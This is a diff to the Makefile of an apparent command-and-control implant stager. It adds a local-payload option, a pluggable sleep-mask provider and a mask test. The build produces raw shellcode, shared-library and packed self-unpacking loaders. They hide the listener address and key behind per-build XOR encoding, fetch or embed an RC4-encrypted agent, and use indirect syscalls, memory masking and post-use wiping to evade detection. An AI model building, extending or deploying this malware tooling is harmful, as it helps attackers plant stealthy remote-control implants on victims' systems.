@@ -101,6 +101,8 @@ DOWNLOAD_HOST ?= 127.0.0.1
 DOWNLOAD_PORT ?= 8080
 DOWNLOAD_PATH ?= /payload
 DOWNLOAD_KEY ?= secret
+PAYLOAD ?= download
+PAYLOAD_FILE ?=
 MODULE_PATH ?= 
 # Generate random XOR key per build
 XOR_KEY_VALUE := $(shell python3 -c "import random; print(hex(random.randint(128, 255)))")
@@ -168,13 +170,17 @@ endif
 
 # Config options
 COMMON_CFLAGS += $(DYNLOAD_MODE_CFLAG) $(HASH_STYLE_CFLAG)
+COMMON_CFLAGS += -DCONFIG_XOR_KEY=$(XOR_KEY_VALUE)
+# The downloader owns the listener address/key strings; local payloads compile
+# all of that (and the transport) out.
+ifneq ($(PAYLOAD),local)
 COMMON_CFLAGS += -DENCODED_HOST="$(XOR_HOST)"
 COMMON_CFLAGS += -DENCODED_PORT="$(XOR_PORT)"
 COMMON_CFLAGS += -DENCODED_PATH="$(XOR_PATH)"
 COMMON_CFLAGS += -DENCODED_KEY="$(XOR_KEY)"
 COMMON_CFLAGS += -DENCODED_MODULE_PATH="$(XOR_MODULE_PATH)"
 COMMON_CFLAGS += -DENCODED_LIB_PATH="$(XOR_LIB_PATH)"
-COMMON_CFLAGS += -DCONFIG_XOR_KEY=$(XOR_KEY_VALUE)
+endif
 
 # Freestanding PIC stages never link a runtime or pin an ABI. Hosted SO/EXE
 # stages link glibc at the ABI selected by DYNLOAD_MODE.
@@ -190,12 +196,18 @@ HOSTED_CFLAGS = $(COMMON_CFLAGS) $(HOSTED_TARGET)
 SOCKET_TRANSPORTS := http tcp udp libssl
 DYNLOAD_TRANSPORTS := libcurl libssl
 
+# Debug logging is compiled out in release builds; the shim has nothing to do.
+DEBUG_SRC =
+ifdef DEBUG
+  DEBUG_SRC = $(C2_SRC)/util/debug.c
+endif
+
 # Downloader stage: a separate PIC blob (its own virtual-address space at 0)
 # that the stub maps, runs, then zeroes and unmaps. It holds the transports
 # and the encoded listener config; the payload stays encrypted while in this
 # blob, so no decryption code is needed here.
 DL_SRCS = downloader.c syscalls_indirect.c $(C2_SRC)/util/strings.c $(C2_SRC)/util/system.c \
-          $(C2_SRC)/util/packer.c $(C2_SRC)/util/debug.c
+          $(C2_SRC)/util/packer.c $(DEBUG_SRC)
 ifneq ($(filter $(TRANSPORT),$(SOCKET_TRANSPORTS)),)
   DL_SRCS += $(C2_SRC)/util/net_utils.c
 endif
@@ -208,15 +220,53 @@ DL_TARGET = downloader
 DL_BIN = downloader.bin
 DL_BLOB_H = downloader_blob.h
 
-# Stub stage: the tiny resident entry point that embeds the downloader blob and
+# Payload acquisition provider:
+#   download (default) builds the downloader stage and its transport
+#   local              embeds a prebuilt C agent PIC from PAYLOAD_FILE
+ifeq ($(PAYLOAD),local)
+  ifeq ($(filter clean,$(MAKECMDGOALS)),)
+    ifeq ($(strip $(PAYLOAD_FILE)),)
+      $(error PAYLOAD=local requires PAYLOAD_FILE=<prebuilt agent PIC>)
+    endif
+    ifeq ($(wildcard $(PAYLOAD_FILE)),)
+      $(error PAYLOAD_FILE=$(PAYLOAD_FILE) not found)
+    endif
+  endif
+  COMMON_CFLAGS += -DSTAGER_PAYLOAD_LOCAL=1
+  LOCAL_PAYLOAD_H = local_payload.h
+  STUB_DEPS = $(LOCAL_PAYLOAD_H)
+else ifeq ($(PAYLOAD),download)
+  STUB_DEPS = $(DL_BLOB_H)
+else
+  $(error PAYLOAD=$(PAYLOAD) is not supported; use download or local)
+endif
+
+# Sleep-mask provider. mask.c is the contract glue; mask_<MASK>.c implements
+# stager_mask_sleep(). Add mask_<name>.c and build with MASK=<name>.
+MASK ?= xor
+MASK_SRC = mask_$(MASK).c
+
+# Stub stage: the tiny resident entry point that acquires the agent PIC and
 # owns the agent lifecycle (including the supervisor). It owns decryption so
 # that the parent can keep the payload ciphertext while each supervised child
-# decrypts its own RX view. It resets the shared dynload context with
-# dynload_reset(), so it links dynload.c; --gc-sections drops the unresolved
-# ELF/maps parser the downloader blob carries on its own.
-STUB_SRCS = stub.c syscalls_indirect.c stager_state.c $(C2_SRC)/util/strings.c \
-            $(C2_SRC)/util/system.c $(C2_SRC)/util/rc4.c $(C2_SRC)/util/debug.c \
-            $(C2_SRC)/util/dynload.c
+# decrypts its own RX view. Download payloads link dynload.c for the shared
+# loader context; local payloads compile it out entirely.
+# The local payload path has no downloader and therefore no dynload context to
+# initialise. The mask provider may use the maps parser (mask_xor does), but a
+# custom provider can override MASK_EXTRA_SRC.
+STUB_PAYLOAD_SRCS =
+PAYLOAD_EXTRA_SRC =
+MASK_EXTRA_SRC ?= $(C2_SRC)/util/maps.c
+ifneq ($(PAYLOAD),local)
+  STUB_PAYLOAD_SRCS = $(C2_SRC)/util/dynload.c
+else
+  # Local payload acquisition wipes the embedded ciphertext using the maps
+  # parser, regardless of which mask provider is selected.
+  PAYLOAD_EXTRA_SRC = $(C2_SRC)/util/maps.c
+endif
+STUB_SRCS = stub.c mask.c $(MASK_SRC) syscalls_indirect.c stager_state.c $(C2_SRC)/util/strings.c \
+            $(C2_SRC)/util/system.c $(sort $(MASK_EXTRA_SRC) $(PAYLOAD_EXTRA_SRC)) \
+            $(C2_SRC)/util/rc4.c $(DEBUG_SRC) $(STUB_PAYLOAD_SRCS)
 
 STAGE0_TARGET = stager
 SHELLCODE = stager.bin
@@ -237,7 +287,7 @@ STUB_ELF = unpack_stub.elf
 STUB_BIN = unpack_stub.bin
 PACKED = stager-packed.bin
 
-.PHONY: all raw executable executable-target so packed clean
+.PHONY: all raw executable executable-target so packed test-mask clean FORCE
 
 # Default target generates raw shellcode (.bin)
 all: raw
@@ -248,7 +298,7 @@ raw: $(SHELLCODE)
 # Freestanding stage0 ELF used only as the objcopy source for the raw shellcode:
 # it keeps the custom _start at offset 0 and the tight PIC layout, and links no
 # runtime. The hosted executable is a separate artifact (see $(STAGE0_TARGET)).
-$(RAW_ELF): $(STUB_SRCS) $(DL_BLOB_H)
+$(RAW_ELF): $(STUB_SRCS) $(STUB_DEPS)
 	$(CC) $(PIC_CFLAGS) $(STAGE0_LDFLAGS) -o $@ $(STUB_SRCS)
 
 $(SHELLCODE): $(RAW_ELF)
@@ -284,7 +334,10 @@ $(DL_BLOB_H): $(DL_BIN)
 	print('static const unsigned char downloader_bin[] = { ' + ', '.join(hex(b) for b in enc) + ' };'); \
 	print('#endif')" > $@
 
-$(STAGE0_TARGET): $(STUB_SRCS) $(DL_BLOB_H)
+$(LOCAL_PAYLOAD_H): embed_payload.py pack_rc4.py pack_common.py FORCE
+	python3 embed_payload.py "$(PAYLOAD_FILE)" $@
+
+$(STAGE0_TARGET): $(STUB_SRCS) $(STUB_DEPS)
 	$(CC) $(HOSTED_CFLAGS) -DSTAGER_LINKED_LIBC $(HOSTED_LDFLAGS) -o $@ $(STUB_SRCS)
 	@echo "[+] Exported symbols in $(STAGE0_TARGET):"
 	@nm $@ 2>/dev/null | grep ' [T|g] ' || readelf -W -s $@ 2>/dev/null | grep ' FUNC ' || true
@@ -292,11 +345,32 @@ $(STAGE0_TARGET): $(STUB_SRCS) $(DL_BLOB_H)
 # 3. Shared Library (.so)
 so: $(SHARED_LIB)
 
-$(SHARED_LIB): $(STUB_SRCS) $(DL_BLOB_H)
+$(SHARED_LIB): $(STUB_SRCS) $(STUB_DEPS)
 	$(CC) $(HOSTED_CFLAGS) -DSTAGER_LINKED_LIBC -shared $(HOSTED_LDFLAGS) -o $@ $(STUB_SRCS)
 	@echo "Shared library generated at $(PWD)/$@"
 	@echo "[+] Exported symbols in $(SHARED_LIB):"
 	@nm -D $@ 2>/dev/null | grep ' [T|g] ' || nm $@ 2>/dev/null | grep ' [T|g] ' || readelf -W -s $@ 2>/dev/null | grep ' FUNC ' || true
+
+# ---- mask stub test -----------------------------------------------------
+# Build the mask stub as a shared object (a separate mapping from the test
+# executable it masks) and verify the canary changes while masked and is
+# restored afterwards.
+MASK_TEST_LIB = tests/libmask_test.so
+MASK_TEST_BIN = tests/test_mask
+
+test-mask: $(MASK_TEST_LIB) $(MASK_TEST_BIN)
+	./$(MASK_TEST_BIN)
+
+$(MASK_TEST_LIB): mask.c mask.h $(MASK_SRC) | tests
+	$(CC) -O2 -fPIC -shared -I. -I../../c_agent/include -o $@ mask.c $(MASK_SRC) $(MASK_EXTRA_SRC)
+
+$(MASK_TEST_BIN): tests/test_mask.c | tests
+	$(CC) -O2 -I. -o $@ tests/test_mask.c -ldl
+
+tests:
+	mkdir -p tests
+
+FORCE:
 
 # 4. Packed self-unpacking shellcode
 packed: $(PACKED)
@@ -320,5 +394,5 @@ $(PACKED): $(SHELLCODE) $(STUB_BIN) $(STUB_ELF)
 
 clean:
 	rm -f $(STAGE0_TARGET) $(SHELLCODE) $(RAW_ELF) $(SHARED_LIB) \
-		$(STUB_ELF) $(STUB_BIN) $(PACKED) \
-		downloader downloader.bin downloader_blob.h *.o
+		$(STUB_ELF) $(STUB_BIN) $(PACKED) $(MASK_TEST_LIB) $(MASK_TEST_BIN) \
+		downloader downloader.bin downloader_blob.h local_payload.h *.o
